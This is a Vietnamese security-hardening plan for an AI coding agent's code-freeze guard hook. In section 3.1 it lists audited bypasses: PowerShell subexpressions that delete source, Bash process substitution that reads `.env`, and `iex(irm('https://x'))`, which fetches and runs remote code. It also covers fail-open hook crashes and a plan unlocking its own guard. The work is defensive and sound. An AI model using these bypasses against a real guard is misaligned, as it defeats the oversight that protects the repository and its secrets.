# Kế Hoạch Triển Khai: Agent Harness Security Hardening (Audit P0/P1/P2 — bỏ qua P0-2)

- **Revision**: 1
- **Status**: Completed
- **Date**: 2026-10-24
- **Author**: Claude Code CLI (`[PLANNER_MODEL: claude-code-cli]`)

## Technical Plan

### 1. Mục Tiêu (Goal) & Out of Scope

#### 1.1 Mục tiêu

Đóng các lỗ hổng mà audit agent harness đã chỉ ra trong `.agents/scripts/code-freeze-guard.js`, `.agents/scripts/run-claude.ps1`, `.agents/hooks.json` và bề mặt cấu hình Claude Code (`CLAUDE.md`, `.claude/`). Đồng thời sửa test `TC-08` đang fail. Mỗi hạng mục có tiêu chí hoàn thành đo được:

| ID   | Hạng mục                                       | Tiêu chí hoàn thành (đo được)                                                                                                                                                                                                                                         |
| :--- | :--------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| P0-1 | Thay blacklist ký tự bằng whitelist theo token | `decide({command})` trả `ask` cho mọi Negative Probe ở §8 TC-A (subexpression/grouping/scriptblock/splat của PowerShell, process substitution của Bash, smart quotes, newline); mọi lệnh hợp lệ hiện có trong `code-freeze-guard.test.ts` vẫn `allow`                 |
| P0-3 | Đưa file hạ tầng vào danh sách always-ask      | Ghi vào 9 file + `.claude/**` luôn trả `ask` kể cả khi plan đã duyệt và đã khai báo file đó; so khớp không phân biệt hoa thường (Windows)                                                                                                                             |
| P0-4 | Sửa TC-08                                      | Tổng `always_on` `< 18,000` ký tự (mục tiêu đo được `<= 17,000` để còn dư); 15 mục M5 trong TC-08 vẫn pass                                                                                                                                                            |
| P1-5 | Chặn đọc `.env*` qua git và qua tool đọc       | `git diff/show/log/status/blame` có token trỏ tới `.env*` hoặc dùng `--no-index` → `ask`; `run-claude.ps1` deny tương ứng; `.agents/hooks.json` matcher có `view_file                                                                                                 | read_file` |
| P1-6 | Bề mặt Claude Code                             | Có `CLAUDE.md` import `00-core.md` + `05-plan-review.md`; có `.claude/settings.json` với PreToolUse hook `onFailure: block`; `.claude/settings.local.json` không còn quyền git mutating và rule deep-research cũ; 4 skill `vikini-*` hiện diện trong `.claude/skills` |
| P1-7 | Giới hạn phạm vi plan đã duyệt                 | Plan Approved chỉ mở khóa đúng các file khai báo `[NEW]/[MODIFY]/[DELETE]` trong `## Technical Plan` của plan đang active; file không khai báo → `ask`                                                                                                                |
| P2   | Hardening phụ                                  | `main()` lỗi bất ngờ → exit `2`; mở rộng `FAST_TRACK_FORBIDDEN_CONTENT` cho `.tsx`; `run-claude.ps1` lấy repo root từ `$PSScriptRoot`; sửa đường dẫn cũ trong `streaming-patterns/SKILL.md` và `mental-simulation.md`; dọn rác ở root                                 |

#### 1.2 What We're NOT Doing (Out of Scope)

- **P0-2**: bỏ qua theo quyết định của PM.
- Không viết lại `.agents/hooks.json` cho Antigravity theo cơ chế khác (giữ `node scripts/code-freeze-guard.js`, chỉ mở rộng matcher).
- Không thêm sandbox OS-level, không đổi `--permission-mode` của `run-claude.ps1`.
- Không chặn `git log -p` / `git show <commit>` không kèm pathspec. Chúng có thể in nội dung `.env*` nếu file từng bị commit. `.env*.local` đang bị gitignore (`[SRC]` `.gitignore:5-8`), nên đây là rủi ro tồn dư có ghi nhận (Risk R6).
- Không sửa wire-format SSE trong `streaming-patterns/SKILL.md` (bảng sự kiện ở dòng 24-31 lệch với `sendEvent` thực tế). P2 chỉ sửa **đường dẫn cũ**, việc lệch format để task sau.
- Không đổi ngưỡng `< 18000` của TC-08 và không bớt bất kỳ `expect()` nào của 15 mục M5.
- Không chạm `src/**` (task này chỉ thuộc harness/governance).
- Không đổi thuật toán chọn date-group của `evaluateLatestDateGroupPlans()` (fail-safe freeze giữ nguyên).

### 2. Tài Liệu Cần Tham Chiếu (Pre-Work Reading) & Skills Loaded & Applied

#### 2.1 Pre-Work Reading

| File                                                                                                                       | Nội dung rút ra                                                                                                                       |
| :------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------ |
| `.agents/rules/00-core.md`                                                                                                 | Danh sách lệnh git cấm/cho phép (`:58-64`), co-located test bắt buộc cho `.agents/scripts/` (`:41`), giới hạn kích thước file (`:42`) |
| `.agents/rules/01-coding.md`                                                                                               | Bảng Enforcement Status (`:13-17`) nhắc tới hook qua `.agents/hooks.json`                                                             |
| `.agents/rules/02-quality.md`                                                                                              | Bảng Pre-Work (`:12-31`), giới hạn ký tự Governance (`:86-90`), Test Triage A/B/C (`:65-75`)                                          |
| `.agents/rules/05-plan-review.md`                                                                                          | 5 danh mục always-ask (`:15`), Fast-Track (`:17-26`), điều kiện mở khóa (`:52`)                                                       |
| `.agents/agents/reviewer/evidence-bar.md`                                                                                  | §4.5.3 Enforcement Claim Verification (`:43-50`), §4.5.4 Risk Table Audit (`:52-54`)                                                  |
| `.agents/agents/reviewer/allowlist.md`                                                                                     | Nhóm lệnh git đọc (`:24`), cấm đọc secrets (`:32`)                                                                                    |
| `.agents/agents/reviewer/mental-simulation.md`                                                                             | Đường dẫn cũ ở S6 và Open Inquiry (`:52,54,59`)                                                                                       |
| `.agents/scripts/code-freeze-guard.js` (926 dòng)                                                                          | Toàn bộ `decide()`, `READ_ONLY_COMMANDS`, `isPlanApproved()`, `main()`                                                                |
| `.agents/scripts/code-freeze-guard.test.ts`                                                                                | 120 test; TC-08 ở `:1495-1603`; test `planApproved: true` ở `:197-216`, `:904-917`; test matcher hooks.json ở `:1428-1436`            |
| `.agents/scripts/run-claude.ps1`                                                                                           | `Get-Location` (`:26`), glob `docs/plans` tương đối (`:101`), danh sách allow/deny (`:165,170`), hook settings (`:209`)               |
| `.agents/hooks.json`, `.claude/settings.local.json`, `.gitignore`, `.husky/install.mjs`, `.prettierignore`, `package.json` | Cấu hình hiện tại (trích dẫn ở §3)                                                                                                    |
| `.agents/README.md:68-81`, `docs/architecture.md:260-264`                                                                  | Tài liệu sống mô tả Scoped Protection (phải đồng bộ)                                                                                  |
| `.agents/skills/streaming-patterns/SKILL.md`                                                                               | Bảng Key Files có đường dẫn cũ (`:39-51`, `:114-116`)                                                                                 |

#### 2.2 Skills Loaded & Applied

| SKILL.md                                                              | Lý do nạp (02-quality Pre-Work)                                                                         | Quyết định kỹ thuật chịu ảnh hưởng                                                                                                                                                                                                                                                                                       |
| :-------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------ | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.agents/skills/vikini-investigate/SKILL.md` (Mode 4 `/blast-radius`) | Sửa module dùng chung (`code-freeze-guard.js` được import bởi `scripts/code-freeze-guard.js:6` và test) | Giữ nguyên **mọi export hiện có** của `code-freeze-guard.js` (re-export từ module mới) để `scripts/code-freeze-guard.js` và 120 test hiện có không vỡ import; giữ chuỗi `export function isPlanApproved()` mà TC-08 kiểm tra (`code-freeze-guard.test.ts:1583`)                                                          |
| `.agents/skills/vikini-debug/SKILL.md`                                | TC-08 đang fail (bug fixing)                                                                            | Root cause đã xác nhận bằng `[CMD]` (`expected 19434 to be less than 18000`). Root cause sâu hơn: lint-staged chạy `prettier --write` trên `*.md` (`package.json:135-137`) nên bảng markdown bị pad lại. Fix gốc là đổi bảng sang danh sách bullet thay vì cắt tay khoảng trắng. Post-Fix: ghi `docs/lessons-learned.md` |
| `.agents/skills/vikini-audit/SKILL.md`                                | Đây là bản sửa theo audit                                                                               | Áp kiểm tra giới hạn kích thước file: `code-freeze-guard.js` đã 926 dòng, nên **trích xuất** logic mới ra module riêng thay vì nhồi thêm                                                                                                                                                                                 |
| `docs/security.md` (domain Auth/Security)                             | Task thuần bảo mật harness                                                                              | Fail-closed ở mọi nhánh mơ hồ (token lạ, plan lỗi parse, hook crash → exit 2)                                                                                                                                                                                                                                            |
| `.agents/skills/streaming-patterns/SKILL.md`                          | P2 sửa chính file này                                                                                   | Chỉ sửa đường dẫn trong bảng Key Files và mục "Adding a New Event Type"; không sửa wire format (Out of Scope)                                                                                                                                                                                                            |

`api-patterns`, `database-migration`, `add-translation`, `add-feature` **không áp dụng**: task không đụng API route, DB, UI text hay tính năng mới.

### 3. Assumptions & Cross-Task Dependencies

#### 3.1 Giả định kỹ thuật có dẫn chứng

- **A1 — Bypass P0-1 có thật.** `[SRC]` `.agents/scripts/code-freeze-guard.js:62` cho phép `^git (?:status|diff|log|show|blame)(?: \S+)*$`. `[SRC]` `:69` `SHELL_ESCAPE_HATCHES = /[;|&\`]|\$\(|>>?|\btee\b/`không chặn`(`, `{`, `@`, `<`, `$var`hay smart quotes. Theo`[URL]` about_Parsing, ở argument mode *"Parentheses (`()`) begin a new expression"* và *"Braces (`{}`) begin a new scriptblock"\*. Hệ quả:
  - `git status (Remove-Item -Recurse src)` khớp `:62`.
  - `git diff <(cat .env)` (Bash process substitution, `[URL]` GNU Bash manual) khớp `:62`.
  - `run-claude.ps1 ... -Task (iex(irm('https://x')))` khớp nhánh `\S+` của `-(?:Task|Prompt)` ở `:63`.

  Cả ba đều trả `allow`.

- **A2 — Smart quotes là delimiter trong PowerShell.** `[URL]` about_Quoting_Rules: PowerShell coi U+2018/U+2019/U+201A/U+201B là nháy đơn và U+201C/U+201D/U+201E là nháy kép. Nghĩa là `'...’` có thể đóng chuỗi sớm, nên whitelist phải cấm các ký tự này ở mọi vị trí.
- **A3 — Exit code của hook.** `[URL]` Claude Code hooks: exit `2` = blocking error; exit khác `0/2` = _non-blocking_ (tool vẫn chạy) trừ khi có `onFailure: "block"`. `[SRC]` `code-freeze-guard.js:895-926`: `main()` chỉ `try/catch` quanh parse + `decide`. Nếu `formatHookOutput`/`stdout.write` ném lỗi, hoặc có lỗi lúc import, node thoát `1` (non-blocking) → **fail-open** khi hook chạy trong cấu hình không có `onFailure: block` (Antigravity `.agents/hooks.json:5-11`).
- **A4 — Hook settings của Claude Code.** `[URL]` Claude Code hooks: `.claude/settings.json` nhận `hooks.PreToolUse[].matcher` (chuỗi `A|B`), hook `type: "command"` có `command` + `args`, `${CLAUDE_PROJECT_DIR}` trỏ về project root, `onFailure: "block"` (yêu cầu Claude Code `>= v2.1.295`). Tên tool cho matcher: `Bash`, `PowerShell`, `Read`, `Grep`, `Glob`, `Edit`, `Write`. Payload có `tool_name`, `tool_input`, `hook_event_name`, `permission_mode`; khớp với `extractInput` (`code-freeze-guard.js:769-783`).
- **A5 — Grep có thể đọc nội dung `.env`.** `[URL]` permissions: _"Grep and Glob search the directory the `path` argument resolves to"_. `[SRC]` `code-freeze-guard.js:537-541` chỉ coi `Read|read_file|view_file` là tool đọc. Vì vậy P1-5 mở rộng nhánh đọc cho `Grep` (`path` + `glob`). Không thêm `Glob` (chỉ trả tên file, không trả nội dung).
- **A6 — CLAUDE.md import.** `[URL]` Claude Code memory: _"CLAUDE.md files can import additional files using `@path/to/import` syntax… Relative paths resolve relative to the file containing the import… maximum depth of four hops"_. Import trong code span bị bỏ qua, nên các dòng `@` phải đặt ngoài backtick.
- **A7 — Project skills.** `[URL]` Claude Code skills: skill được nạp từ `.claude/skills/<name>/SKILL.md`; chỉ `description` là khuyến nghị. Symlink được hỗ trợ nhưng tạo symlink trên Windows cần Developer Mode/quyền admin và cấu hình `core.symlinks`. Do đó chọn **stub SKILL.md trỏ về nguồn** (single source of truth tại `.agents/skills/`).
- **A8 — `.claude/skills` đang bị gitignore.** `[SRC]` `.gitignore:52-53` (`.claude/skill`, `.claude/skills`). Phải đổi thành `.claude/skills/*` + `!.claude/skills/vikini-*/` thì stub mới được track.
- **A9 — Prettier pad lại bảng markdown khi commit.** `[SRC]` `package.json:135-137` (`"*.{json,css,md}": ["prettier --write"]`), `[SRC]` `.prettierignore:1-14` không loại `.agents/`. Bảng Pre-Work ở `02-quality.md:12-31` có cột thứ 3 gần như rỗng nhưng được pad tới ~170 ký tự/dòng. Muốn tiết kiệm ký tự bền vững thì phải chuyển bảng sang bullet list.
- **A10 — Số đo TC-08 hiện tại.** `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `1 failed | 119 passed (120)`, `AssertionError: expected 19434 to be less than 18000` tại `code-freeze-guard.test.ts:1508`. Cần cắt `>= 1,435` ký tự; mục tiêu cắt `>= 2,434` để còn `<= 17,000`. Phần chữ thêm vào `05-plan-review.md` cho P0-3/P1-7 cũng phải tính vào ngân sách này.
- **A11 — Định dạng khai báo file trong plan rất đa dạng.** `[SRC]` `docs/plans/2026-09-28-fix-streaming-abort-text-loss-implementation-plan.md:106-132` dùng `[NEW]    path`; `docs/plans/2026-09-17-multi-agent-system-implementation-plan.md:24-26` dùng `` - `[NEW]` `path` ``. Parser phải chấp nhận cả thẻ có backtick lẫn không, cả path có backtick lẫn không, cùng link markdown `[`path`](file:///...)`.
- **A12 — Plan cùng ngày.** `[SRC]` `docs/plans/2026-10-24-*.md` có 3 plan khác đều `Status: Completed`. Plan này (`Ready for Review`) sẽ freeze nhóm ngày 2026-10-24 theo fail-safe (`code-freeze-guard.js:287-294`). Đây là hành vi đúng thiết kế.
- **A13 — Node runtime.** `[SRC]` `package.json:119-121` `"node": "24.x"`; `.agents/scripts/package.json:2` `"type": "module"`, nên module mới dùng ESM `.js` + `// @ts-check` giống `code-freeze-guard.js:1`, được `tsconfig.json:4,31` (`allowJs`, `**/*.js`) type-check.

#### 3.2 Cross-Task Dependencies

- **Self-application:** Hầu như mọi file của task này đều thuộc `.agents/**` hoặc danh sách infra mới, nên **luôn `ask`** kể cả sau `[PLAN_APPROVED]`. Khi thực thi, PM phải duyệt từng lần ghi. Đây là chủ đích, không phải lỗi.
- **Thứ tự bắt buộc:** Bước 1 (trích module) → Bước 2 (P0-1) → Bước 3 (P1-5) → Bước 4 (P0-3) → Bước 5 (P1-7). Lý do: P1-5 dùng tokenizer của P0-1; P1-7 phải chạy **sau** gate infra của P0-3 để một plan không thể tự mở khóa `scripts/code-freeze-guard.js`.
- `.claude/settings.json` (P1-6) bật hook cho mọi phiên Claude Code tương tác. Phải cài **sau** khi P1-7 + P0-1 đã pass test, tránh hook cũ chặn sai trong lúc đang sửa.

#### 3.3 `[NEEDS_PRODUCT_DECISION]`

| #   | Câu hỏi                                                                                               | Default Assumption (áp dụng nếu PM không phản hồi)                                                                                                                                                                                                        |
| :-- | :---------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| D1  | P1-7: file **ngoài `src/**`** không được khai báo (vd `public/x.svg`, `README.md`) thì xử lý thế nào? | `ask` cho **mọi** file không khai báo (chặt hơn brief "src/\*\*", vì fail-closed). Các gate allow sẵn có (docs/, artifact, Fast-Track) giữ nguyên                                                                                                         |
| D2  | Xóa `.audit_run7.tmp.md`, `temp.html`, `.superpowers/`                                                | Trước khi xóa chạy `git ls-files -- .audit_run7.tmp.md temp.html .superpowers`. File **tracked** → xóa (khôi phục được qua git). File **untracked** → chỉ thêm vào `.gitignore`, việc xóa phải được PM xác nhận riêng lúc thực thi (không khôi phục được) |
| D3  | `.claude/**` có toàn bộ là infra always-ask không (kể cả `.claude/skills/**`)?                        | Có. Prefix `.claude/` always-ask (bao 2 file brief yêu cầu + stub skills)                                                                                                                                                                                 |

### 4. Bảng Verified Versions

| Thành phần                     | Phiên bản dự án (`[SRC]`)                                    | Tài liệu chính thức 2026 (`[URL]`)                                                                                                                                                                                              | Điều đã xác minh                                                                                                                   |
| :----------------------------- | :----------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------- |
| Node.js                        | `24.x` (`package.json:120`)                                  | https://nodejs.org/docs/latest-v24.x/api/process.html#processexitcode                                                                                                                                                           | `process.exitCode`, `process.on("uncaughtException")` cho P2 exit 2                                                                |
| Vitest                         | `^4.1.12` (`package.json:117`; `[CMD]` output `RUN v4.1.12`) | https://vitest.dev/api/                                                                                                                                                                                                         | `describe/it/expect`, `spawnSync` integration (đã dùng tại test `:1313-1352`)                                                      |
| TypeScript                     | `^5.9.3` (`package.json:115`)                                | https://www.typescriptlang.org/docs/handbook/intro-to-js-ts.html                                                                                                                                                                | `// @ts-check` + JSDoc cho `.js` (tsconfig `allowJs`)                                                                              |
| Prettier                       | `^3.7.4` (`package.json:111`)                                | https://prettier.io/docs/options                                                                                                                                                                                                | Format lại bảng markdown khi lint-staged chạy (A9)                                                                                 |
| Husky / lint-staged            | `^9.1.7` / `^16.2.7` (`package.json:107,109`)                | https://typicode.github.io/husky/ , https://github.com/lint-staged/lint-staged                                                                                                                                                  | `.husky/install.mjs` chạy qua `prepare` (`package.json:28`), nên là bề mặt thực thi code cần protect                               |
| Claude Code hooks              | CLI hiện tại (yêu cầu `>= v2.1.295` cho `onFailure`)         | https://code.claude.com/docs/en/hooks                                                                                                                                                                                           | Exit code semantics, `permissionDecision` (`allow/deny/ask/defer`), `onFailure`, `${CLAUDE_PROJECT_DIR}`, `args`                   |
| Claude Code permissions        | —                                                            | https://code.claude.com/docs/en/permissions                                                                                                                                                                                     | Wildcard `*` ở mọi vị trí; deny áp dụng cho từng subcommand; Read deny cũng áp lên Grep/Glob path; PowerShell rules cùng dạng Bash |
| Claude Code memory / skills    | —                                                            | https://code.claude.com/docs/en/memory , https://code.claude.com/docs/en/skills                                                                                                                                                 | `@path` import (4 hops), `.claude/skills/<name>/SKILL.md`                                                                          |
| Windows PowerShell 5.1 parsing | PS 5.1 (`02-quality.md:59-63`)                               | https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_parsing , https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-5.1 | Metacharacters argument mode: ``<space> ' " ` , ; ( ) { } \| & < > @ #`` (`< > @ #` chỉ đặc biệt ở đầu token); `--%`; smart quotes |
| GNU Bash                       | Git Bash (Claude Bash tool)                                  | https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html                                                                                                                                                    | `<(list)`, `>(list)`                                                                                                               |
| git pathspec                   | —                                                            | https://git-scm.com/docs/gitglossary#Documentation/gitglossary.txt-aiddefpathspecapathspec                                                                                                                                      | Pathspec hỗ trợ glob (`*?[`) và magic `:(…)`, `:/`, `:!`, nên phải chặn ký tự glob trong token git (P1-5)                          |

Không thêm dependency mới nào vào `package.json`.

### 5. Files Cần Chỉnh Sửa / Tạo Mới

Danh sách dưới đây là **nguồn khai báo duy nhất** cho P1-7 khi chính plan này được duyệt. Mỗi dòng giữ đúng định dạng `[TAG] path`.

**Guard core (`.agents/scripts/`)**

- `[NEW]` `.agents/scripts/guard-paths.js`: chứa `REPO_ROOT`, `toPosix`, `toRepoRelative` (chuyển từ guard sang), cùng hàm mới `isEnvSecretPath`, `normalizeForCompare`.
- `[NEW]` `.agents/scripts/guard-paths.test.ts`
- `[NEW]` `.agents/scripts/command-policy.js`: tokenizer + whitelist token + validator cho `run-claude.ps1` + chặn `.env` trong lệnh (P0-1, P1-5).
- `[NEW]` `.agents/scripts/command-policy.test.ts`
- `[NEW]` `.agents/scripts/plan-scope.js`: `extractDeclaredFiles`, `getActiveApprovedPlans`, `getApprovedPlanScope` (P1-7).
- `[NEW]` `.agents/scripts/plan-scope.test.ts`
- `[MODIFY]` `.agents/scripts/code-freeze-guard.js`: xóa `READ_ONLY_COMMANDS`/`SHELL_ESCAPE_HATCHES`/`MUTATING_FLAGS` và nhánh `;` (chuyển sang `command-policy.js`); thêm `PROTECTED_INFRA_FILES` + `isProtectedInfraFile`; nhánh đọc mở rộng cho `Grep`; scope theo plan; `runHook()` + exit 2; mở rộng `FAST_TRACK_FORBIDDEN_CONTENT`; re-export toàn bộ API cũ.
- `[MODIFY]` `.agents/scripts/code-freeze-guard.test.ts`: cập nhật Loại C (§8) + test mới.
- `[MODIFY]` `.agents/scripts/run-claude.ps1`
- `[MODIFY]` `.agents/hooks.json`

**Claude Code surface**

- `[NEW]` `CLAUDE.md`
- `[NEW]` `.claude/settings.json`
- `[MODIFY]` `.claude/settings.local.json`
- `[NEW]` `.claude/skills/vikini-debug/SKILL.md`
- `[NEW]` `.claude/skills/vikini-audit/SKILL.md`
- `[NEW]` `.claude/skills/vikini-investigate/SKILL.md`
- `[NEW]` `.claude/skills/vikini-simplify/SKILL.md`
- `[MODIFY]` `.gitignore`

**Governance docs (P0-4 + đồng bộ tài liệu sống)**

- `[MODIFY]` `.agents/rules/02-quality.md`
- `[MODIFY]` `.agents/rules/05-plan-review.md`
- `[MODIFY]` `.agents/rules/00-core.md` (chỉ sửa câu git read-only ở `:62` để nhắc ban `.env` pathspec, giữ nguyên 3 chuỗi M5)
- `[MODIFY]` `.agents/agents/reviewer/allowlist.md`
- `[MODIFY]` `.agents/agents/reviewer/mental-simulation.md`
- `[MODIFY]` `.agents/skills/streaming-patterns/SKILL.md`
- `[MODIFY]` `.agents/README.md`
- `[MODIFY]` `docs/architecture.md`
- `[MODIFY]` `docs/CHANGELOG.md`
- `[MODIFY]` `docs/lessons-learned.md`

**Root junk (theo D2)**

- `[DELETE]` `.audit_run7.tmp.md`
- `[DELETE]` `temp.html`
- `[DELETE]` `.superpowers/sdd/progress.md` (và các file còn lại dưới `.superpowers/sdd/`, xem D2: xóa chỉ khi tracked hoặc PM xác nhận)

**Không đổi:** `scripts/code-freeze-guard.js`. Proxy `import "../.agents/scripts/code-freeze-guard.js"` (`:6`) vẫn hoạt động vì entrypoint check `endsWith("code-freeze-guard.js")` (`code-freeze-guard.js:924`) được giữ. File chỉ được **bảo vệ** qua P0-3.

### 6. Caller-First Design Sketch

#### 6.1 Phía hook (call site không đổi)

```js
// code-freeze-guard.js — entrypoint (sau P2)
if (process.argv[1] && path.resolve(process.argv[1]).endsWith("code-freeze-guard.js")) {
  installCrashHandlers(); // uncaughtException/unhandledRejection → stderr + exit 2
  readStdin().then((raw) => {
    const { stdout, exitCode } = runHook(raw); // pure, testable
    if (stdout) process.stdout.write(stdout);
    process.exitCode = exitCode; // 0 bình thường, 2 khi lỗi nội bộ
  });
}
```

```js
/**
 * @param {string} raw
 * @param {{ decide?: typeof decide, extractInput?: typeof extractInput }} [deps]
 * @returns {{ stdout: string, stderr: string, exitCode: 0 | 2 }}
 */
export function runHook(raw, deps = {}) {
  /* JSON.parse lỗi → ask (exit 0, như cũ); lỗi khác → exit 2 */
}
```

#### 6.2 Phía `decide()` (thứ tự gate mới, chỉ phần đường dẫn)

```
0. Read-class tools (Read|read_file|view_file|Grep): isEnvSecretPath(path) || isEnvSecretPath(glob) → ask; else allow
1. Ngoài repo → Antigravity artifact? allow : ask
2. .gemini/ .git/ .env* → ask
3. Unfrozen docs/** (.md only, self-forgery guard) → allow
3b. TEST_INFRA_FILES → ask            (giữ nguyên)
3c. isProtectedInfraFile(relative) → ask   ← P0-3 (MỚI)
4. Test file → ask; 5. *.server.* → ask; 6. migration → ask; 7. .agents/** → ask
8. Fast-Track → allow
9. Scoped plan: resolvePlanScope(options) → approved && isDeclared(relative) ? allow : ask  ← P1-7
```

Các phép so sánh ở bước 2, 3b, 3c, 7 và 9 dùng `normalizeForCompare(relative)` (lower-case) để `.AGENTS/rules/x.md`, `Claude.md`, `.Claude/Settings.json` không qua mặt guard trên NTFS (vốn không phân biệt hoa thường).

#### 6.3 `DecideOptions` mới (tương thích ngược)

```js
/** @typedef {{ planApproved?: boolean, approvedFiles?: readonly string[] }} DecideOptions */
// resolvePlanScope(options):
//   planApproved === false                       → { approved: false, files: [] }
//   approvedFiles !== undefined                  → { approved: planApproved !== false, files: approvedFiles }
//   planApproved === true && approvedFiles undef → { approved: true, files: [] }   // fail-closed: không khai báo = ask
//   cả hai undefined                             → getApprovedPlanScope()          // đọc docs/plans/
```

#### 6.4 `command-policy.js` (P0-1 + P1-5)

```js
/** @returns {{ ok: true } | { ok: false, reason: string }} */
export function evaluateCommand(command) {
  // 1. Reject toàn cục: CR/LF/NUL, smart quotes U+2018–U+201F, ký tự ngoài ASCII in được ở ngoài vùng nháy hợp lệ.
  // 2. tokenizeCommand(command) → { segments: string[][] } | { error }
  //    - split theo whitespace; ';' NGOÀI nháy là separator cấp cao (PowerShell 5.1 gate chain).
  //    - Nháy chỉ hợp lệ khi bao TRỌN token: '…' (không chứa ' ) hoặc "…" (không chứa " $ ` \ ).
  //    - Mọi ký tự |, &, <, >, (, ), {, }, `, $ ngoài nháy → error.
  // 3. Mỗi segment: matchAllowlistedCommand(tokens) → đúng 1 rule trong COMMAND_RULES.
  // 4. Token không nháy phải khớp SAFE_TOKEN; token nháy chỉ được phép ở vị trí rule khai báo (quotedSlots).
  // 5. referencesEnvSecret(tokens) / git --no-index → reject (P1-5).
}
export const SAFE_TOKEN = /^(?![@~^,=+:-]{2})[A-Za-z0-9._\/\\-][A-Za-z0-9._\/\\:=,+~^@\[\]-]*$/; // phác thảo, chốt trong test
```

Mô hình rule (dữ liệu, không regex nguyên dòng):

```js
const COMMAND_RULES = [
  { prefix: ["npm", "run", /^(?:type-check|lint|test:run|verify)$/], rest: "none" },
  { prefix: ["npm", "run", "test:run", "--"], rest: "vitestArgs", minRest: 1 },
  { prefix: ["npx", "vitest", /^(?:run|list)$/], rest: "vitestArgs" },
  { prefix: ["npx", "tsc", /^--(?:noEmit|showConfig)$/], rest: "none" },
  { prefix: ["npx", "eslint", "--print-config"], rest: "onePath" },
  { prefix: ["npm", "ls"], rest: "safeTokens" },
  { prefix: ["npm", "view"], rest: "safeTokens", minRest: 1 },
  { prefix: ["git", /^(?:status|diff|log|show|blame)$/], rest: "gitArgs" },
  { prefix: [/^powershell(?:\.exe)?$/i], rest: "runClaude" },
  { prefix: [/^claude(?:\.exe)?$/i], rest: "claudeProbe" },
  { prefix: ["node", /^(?:\.[\/\\])?scripts[\/\\]verify-docs\.mjs$/], rest: "verifyDocsArgs" },
];
```

- **`runClaude` validator:** parse `-NoProfile`, `-ExecutionPolicy <Bypass|RemoteSigned|Unrestricted>`, `-File <script>` (token có thể nháy, phải đúng `.agents[/\\]scripts[/\\]run-claude.ps1`). Sau `-File`, các tham số khớp theo **tên**:
  - `-CheckOnly`
  - `-Role|-Mode <planner|reviewer|plan|review>`
  - `-PlanFile docs/plans/<[A-Za-z0-9._-]+>.md`
  - `-Model <[A-Za-z0-9._-]+>`
  - `-ArtifactFile <abs path …/.gemini/antigravity/brain/…/*.md, không "..">`
  - `-Task|-Prompt <value>`

  `value` của `-Task|-Prompt` phải là **một token có nháy**: `'…'` (không chứa `'`) hoặc `"…"` (không chứa `"`, `$`, `` ` ``, `\`), hoặc là token trần khớp `SAFE_TOKEN`. Token bắt đầu bằng `(`, `$`, `@`, `{` luôn bị từ chối.

- **`gitArgs`:** mỗi token khớp `SAFE_TOKEN` và **không** chứa `* ? [ ]`; từ chối `--output*`, `--no-index`, `--ext-diff`, `-c`/`-C`. Với mỗi token, bỏ tiền tố `<rev>:` (cắt tới dấu `:` cuối cùng), tách theo `/` và `\`; nếu có segment khớp `/^\.env/i` → reject (P1-5).
- `MUTATING_FLAGS` cũ được giữ làm lớp phụ cho `vitestArgs`/`safeTokens` (giữ hành vi các test `:318-372`).

#### 6.5 `plan-scope.js` (P1-7)

```js
/** Trích file khai báo trong phần Technical Plan (trước "## Audit History"). */
export function extractDeclaredFiles(content) /* : string[] repo-relative POSIX, lower-case-normalised set source */
/** Trả về các plan Approved của nhóm ngày mới nhất; [] nếu có plan pending (fail-safe giữ nguyên). */
export function getActiveApprovedPlans(planEntries, options) /* : Array<{filename, content}> */
/** Đọc docs/plans/, hợp nhất declared files của mọi plan active. Lỗi fs → { approved:false, files:[] }. */
export function getApprovedPlanScope() /* : { approved: boolean, files: string[] } */
```

Trong guard:

```js
export function evaluateLatestDateGroupPlans(entries, options = {}) {
  return getActiveApprovedPlans(entries, options).length > 0; // hành vi cũ, 0 test đổi
}
export function isPlanApproved() {
  return getApprovedPlanScope().approved;
} // giữ chữ ký (TC-08 :1583)
```

Quy tắc `extractDeclaredFiles`:

- Chỉ xét dòng nằm sau heading `## Technical Plan` (nếu có) và trước `## Audit History`.
- Dòng phải chứa `\[(NEW|MODIFY|DELETE)\]` (có thể bọc backtick).
- Ứng viên path là span backtick đầu tiên **sau** thẻ; nếu không có thì lấy token không trắng đầu tiên. Bỏ link markdown `[x](url)` → giữ `x`.
- Chuẩn hóa bằng `toRepoRelative`. Loại nếu `null`, chứa `*`/`?`, kết thúc `/`, hoặc chứa `..`.

#### 6.6 Phía test (caller-first)

```ts
expect(
  decide(
    { targetFile: "src/components/Header.tsx" },
    { planApproved: true, approvedFiles: ["src/components/Header.tsx"] }
  ).decision
).toBe("allow");
expect(
  decide(
    { targetFile: "src/components/Footer.tsx" },
    { planApproved: true, approvedFiles: ["src/components/Header.tsx"] }
  ).reason
).toContain("not declared in the active approved plan");
expect(evaluateCommand("git status (Remove-Item -Recurse src)")).toMatchObject({ ok: false });
expect(
  runHook("{}", {
    decide: () => {
      throw new Error("boom");
    },
  }).exitCode
).toBe(2);
```

### 7. Các Bước Thực Hiện Tuần Tự

Sau mỗi bước chạy Tier 1: `npm run type-check`. Sau mỗi bước có test: `npx vitest run .agents/scripts --reporter=dot`.

**Bước 0: Baseline**

- [ ] `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → ghi nhận `1 failed | 119 passed` (chỉ TC-08 fail).
- [ ] `git ls-files -- .audit_run7.tmp.md temp.html .superpowers` → ghi kết quả cho D2.

**Bước 1: Trích module (Subtract Before You Add, không đổi hành vi)**

